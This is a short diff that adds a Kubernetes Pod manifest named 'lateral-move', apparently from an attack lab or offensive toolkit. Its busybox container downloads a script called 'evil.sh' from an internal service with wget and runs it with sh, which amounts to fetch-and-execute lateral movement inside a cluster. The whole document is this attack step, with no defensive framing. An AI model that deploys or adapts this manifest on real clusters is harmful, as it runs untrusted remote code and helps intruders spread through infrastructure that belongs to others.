@@ -1,0 +1,15 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: lateral-move
+spec:
+  containers:
+  - name: lateral
+    image: busybox
+    command:
+      - /bin/sh
+      - -c
+      - |
+        wget http://internal-service:8080/evil.sh -O /tmp/evil.sh;
+        sh /tmp/evil.sh
+  restartPolicy: Never
